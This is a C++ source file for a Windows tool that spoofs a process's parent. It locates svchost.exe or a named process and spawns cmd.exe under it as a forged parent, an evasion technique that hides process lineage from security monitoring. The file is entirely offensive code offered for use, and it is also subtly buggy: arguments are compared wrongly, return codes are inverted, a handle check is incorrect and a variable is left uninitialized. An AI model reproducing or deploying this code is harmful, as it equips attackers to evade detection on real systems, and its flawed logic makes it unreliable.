#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <string.h>
#include <winternl.h>
#include <Psapi.h>

#define TARGET_PROCESS L"svchost.exe"

using namespace std;

DWORD GetTarget(const wchar_t* processname) {
	HANDLE hSnapShot = NULL;
	DWORD PID;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		cerr << "[!] Failed in Process SnapShot [!]" << endl;
		return NULL;
	}
	
	PROCESSENTRY32 pe;
	if (Process32First(hSnapShot, &pe)) {
		do {
			if (wcscmp(pe.szExeFile, processname) == 0) {
				PID = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapShot, &pe));
	}

	CloseHandle(hSnapShot);

	return PID;
}

bool PPiDSpoofing(DWORD PID) {
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, PID);

	if (parentProcessHandle == INVALID_HANDLE_VALUE) {
		cerr << "[!] Failed to Retrieve Handle For Parent Process Handle [!]" << endl;
		return EXIT_FAILURE;
	}

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);

	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	
	if (!CreateProcessA(
		NULL,
		(LPSTR)"cmd.exe",
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&si.StartupInfo,
		&pi
	)) {
		cerr << "[!] Failed To Create Process [!]" << endl;
		cerr << "[!] Error:" << GetLastError() << endl;
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int wmain(int argc, wchar_t* argv[]) {
	DWORD pid;

	if (argc < 2) {
		cerr << "[!] USAGE: <PPID-Spoofing.exe> <Default> OR <processname>" << endl;
		return -1;
	}

	else if (argv[2] == L"Default" || argv[2] == L"default") {
		pid = GetTarget(TARGET_PROCESS);
		cout << "[+] PID:" << pid << endl;
		if (!PPiDSpoofing(pid)) {
			return -1;
		}
	}

	else {
		LPWSTR processname;
		processname = argv[1];
		pid = GetTarget(processname);
		cout << "[+] PID:" << pid << endl;
		if (!PPiDSpoofing(pid)) {
			return -1;
		}
	}

	return 0;
}
